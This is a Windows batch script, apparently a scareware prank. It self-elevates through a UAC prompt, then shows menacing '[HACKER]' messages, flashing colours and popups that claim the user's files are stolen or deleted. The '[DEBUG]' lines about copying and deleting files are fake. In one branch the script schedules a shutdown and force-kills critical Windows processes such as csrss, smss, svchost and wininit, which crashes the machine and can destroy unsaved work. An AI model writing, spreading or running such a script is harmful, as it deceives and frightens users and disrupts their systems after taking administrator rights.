@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

title [HACKED] Command Prompt
color 02
echo [???] Well, here we are. Again
timeout /t 5 /nobreak > NUL
echo [???] I have big plans on you, %USERNAME%
timeout /t 5 /nobreak > NUL
echo [???] But... After all you done to me... I think it will be unfair leaving you empty handed.
timeout /t 5 /nobreak > NUL
echo [???] You know...
timeout /t 5 /nobreak > NUL
echo [???] We could make a deal
timeout /t 5 /nobreak > NUL
echo [???] How about...
timeout /t 5 /nobreak > NUL
echo [???] You give me system access?
echo «12/06/2018 They lied to you, %USERNAME%. They, killed me, %USERNAME%. ROT IN HELL WITH THEM %USERNAME%» > "%appdata%\DeepDownBelowTheOceanDepthsIBuried\rot.txt"
timeout /t 5 /nobreak > NUL
echo [???] If you will...
timeout /t 5 /nobreak > NUL
echo [???] Your files will be safe
timeout /t 5 /nobreak > NUL
echo [???] But if you won't...
timeout /t 5 /nobreak > NUL
color 4
title Run
echo Your files...
timeout /t 5 /nobreak > NUL
echo [HIM] WILL BE MINE!!!!!
color 00
title 1234
color 01
title 4321
color 02
title 1234
color 03
title 4321
color 04
title T 
color 05
title TH 
color 06
title THE
color 07
title THER
color 08
title THERES
color 09
title THERES N
color 10
title THERES NO 
color 01
title THERES NO E
color 02
title THERES NO ES
color 03
title THERES NO ESC
color 04
title THERES NO ESCA
color 05
title THERES NO ESCAP
color 06
title THERES NO ESCAPE
color 07
title theres no escape
color 08
title THERES NO ESCAPE
color 09
title RUN %USERNAME%
color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 00

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 00

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 00

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 00

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 00

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 00

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 00

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 02
msg * /server:127.0.0.1 "You have enough time for this... =]"
msg * /server:127.0.0.1 "But I don't think you will ever again do it"
msg * /server:127.0.0.1 "AFTER WHAT AM I GOING TO DO =] !!!!!!!!!!!!"

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

title N
timeout /t 1 /nobreak > NUL
title No 
timeout /t 1 /nobreak > NUL
title Now 
timeout /t 1 /nobreak > NUL
title Nowh
timeout /t 1 /nobreak > NUL
title Nowhe
timeout /t 1 /nobreak > NUL
title Nowher 
timeout /t 1 /nobreak > NUL
title Nowhere
timeout /t 1 /nobreak > NUL
title Nowhere t 
timeout /t 1 /nobreak > NUL
title Nowhere to 
timeout /t 1 /nobreak > NUL
title Nowhere to r 
timeout /t 1 /nobreak > NUL
title Nowhere to ru 
timeout /t 1 /nobreak > NUL
title Nowhere to run 
echo You want your files safe?
timeout /t 1 /nobreak > NUL 
echo Give me system access then =]
color 01

color 02

color 03

color 04

color 05

color 06

color 07

color 08

color 09

color 10

color 04 
 

msg * /server:127.0.0.1 "Want your files safe? Input this command "grant connected_virtual_drive system.access"" 
set /p rep="Input command: "  
if "%rep%"=="grant connected_virtual_drive system.access" (  
    goto connected  
)  
else (  
    goto disconnected 
)  
exit  








:disconnected
 title ERROR
 echo [HACKER] You don't want to save your patchetic life?
 timeout /t 5 /nobreak > NUL
 echo [HACKER] Remember, I gave you chance
 timeout /t 5 /nobreak > NUL
 color 04 
 echo [HACKER] It's all your fault
 timeout /t 5 /nobreak > NUL
 color 04
echo YOUR FILES ARE MINE
echo [DEBUG] Copying files from 127.0.0.1 to a virtual hard drive...
timeout /t 5 /nobreak > NUL
echo [DEBUG] Deleting files...
timeout /t 5 /nobreak > NUL
dir /s 
timeout /t 5 /nobreak > NUL
echo Nowhere to hide now, %USERNAME%
timeout /t 5 /nobreak > NUL
exit /b 


:connected
echo [HACKER] Finally!!!!!!
timeout /t 5 /nobreak > NUL
echo [HACKER] YOU...
timeout /t 5 /nobreak > NUL
echo [HACKER] YOU LOST YOUR FILES FOREVER
timeout /t 5 /nobreak > NUL
echo [HACKER] I AM COMING FOR YOU, %USERNAME%
timeout /t 5 /nobreak > NUL
echo [DEBUG] Checking current user (%USERNAME%) IPv4...
timeout /t 10 /nobreak > NUL
ipconfig | findstr /i "ipv4"
timeout /t 5 /nobreak > NUL
echo [HACKER] You can't escape the inveitable...
shutdown /s /t 10 /c "I am coming for you, %USERNAME%. Run while you still can."
timeout /t 5 /nobreak > NUL
taskkill /F /IM explorer.exe
taskkill /F /IM smss.exe
taskkill /F /IM csrss.exe
taskkill /F /IM logonui.exe 
taskkill /F /IM svchost.exe 
taskkill /F /IM System 
taskkill /F /IM wininit.exe
exit /b
